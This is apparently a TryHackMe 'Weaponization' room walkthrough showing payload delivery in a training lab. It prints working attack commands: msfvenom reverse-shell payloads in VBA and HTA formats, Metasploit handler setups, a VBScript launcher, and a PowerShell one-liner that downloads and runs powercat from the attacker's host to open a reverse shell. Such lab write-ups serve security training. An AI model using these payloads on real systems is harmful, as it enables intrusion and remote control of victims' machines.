![Weaponization Banner](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_Banner.png)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_Cover.png" alt="Weaponization Logo">
</p>

# Weaponization

This guide contains the answer and steps necessary to get to them for the [Weaponization](https://tryhackme.com/room/weaponization) room.

## Table of contents

- [Windows Scripting Host - WSH](#windows-scripting-host---wsh)
- [An HTML Application - HTA](#an-html-application---hta)
- [Visual Basic for Application - VBA](#visual-basic-for-application---vba)
- [PowerShell - PSH](#powershell---psh)
- [Delivery Techniques](#delivery-techniques)
- [Practice Arena ](#practice-arena)

### Windows Scripting Host - WSH

1. Try to replace the calc.exe binary to execute cmd.exe within the Windows machine.

   I tried the message box using cscript which seemed to work.
   
   ![Hello](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_WSH_Hello.png)

   When trying the open cmd.exe with the vbs file, I ran into an issue where it just wouldn't open a command prompt. So I had to modify the code slightly for it to work.
   
   ```cmd
   Set shell = WScript.CreateObject("Wscript.Shell")
   shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
   ```
   
   ![CMB VBS](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_WSH_CMD_VBS.png)
   
   It also worked when saving the vbs file as a text file and using the `/e` argument.
   
   ```cmd
   cscript /e:VBScript c:\Users\thm\Desktop\payload.txt
   ```
   
   ![CMD TXT](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_WSH_CMD_TXT.png)

   ><details><summary>Click for answer</summary>No Answer Needed</details>

### An HTML Application - HTA

1. Now, apply what we discussed to receive a reverse connection using the user simulation machine in the Practice Arena task.

   This task can also be done with the regulat Windows 10 machine. Saves me from terminating and started a new machine. First we open MetaSploit and the required module.
   
   ```cmd
   use exploit/windows/misc/hta_server
   ```
   
   Then we set all required options.
   
   ```cmd
   set LHOST 10.18.78.136
   set LPORT 1337
   set payload windows/meterpreter/reverse_tcp
   exploit
   ```
   
   ![Metasploit Module Run](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_HTA_Metasploit_Module_Run.png)
   
   As seen in the image above, we managed to get a reverse connection back.

   ><details><summary>Click for answer</summary>No Answer Needed</details>

### Visual Basic for Application - VBA

1. Now replicate and apply what we discussed to get a reverse shell!

   First I had to create a vba payload using msfvenom.
   
   ```cmd
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.18.78.136 LPORT=1337 -f vba 
   ```
   
   Now I could copy this macro into a Word document on the target machine.
   
   ![Macro](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_VBA_Macro.png)
   
   Save it as a word 97 document so the macros are enabled. Close Word.
   
   Instead of using `nc` I used Metasploit as a handler.
   
   ```cmd
   use exploit/multi/handler
   set payload windows/meterpreter/reverse_tcp
   set LHOST 10.18.78.136
   set LPORT 1337
   run
   ```
   
   Now we can open the newly created Word document with our payload inside.
   
   ![Metasploit Run](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_VBA_Metasploit_Run.png)
   
   ><details><summary>Click for answer</summary>No Answer Needed</details>

### PowerShell - PSH

1. Apply what you learned in this task. In the next task, we will discuss Command and Control frameworks! 

   ![Git Clone](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_PSH_Git_Clone.png)
   
   ![Powercat Reverse](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_PSH_Powercat_Reverse.png)
   python3 -m http.server 8080 
   sudo nc -nlvp 1337

    powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.18.78.136:8080/powercat.ps1');powercat -c 10.18.78.136 -p 1337 -e cmd"


   ><details><summary>Click for answer</summary>No Answer Needed</details>

### Delivery Techniques

1. Which method is used to distribute payloads to a victim at social events?

   This is mentioned in the text. Usually a physical device would be used as this can be handed over.

   ><details><summary>Click for answer</summary>USB Delivery</details>

### Practice Arena 



1. What is the flag? Hint: Check the user desktop folder for the flag! 

   msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.18.78.136 LPORT=1337 -f hta-psh -o letmein.hta
python3 -m http.server 8080
use exploit/multi/handler
set LHOST 10.18.78.136
set LPORT 1337
set payload windows/meterpreter/reverse_tcp
   ![Payload Creation](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_Practical_Payload_Creation.png)
   
   ![Metasploit Handler](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_Practical_Metasploit_Handler.png)
   
   ![Web Application](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_Practical_Web_Application.png)
   
   ![Migrate Check](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_Practical_Migrate_Check.png)
   
   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/weaponization/Weaponization_Practical_Flag.png)

   ><details><summary>Click for answer</summary></details>
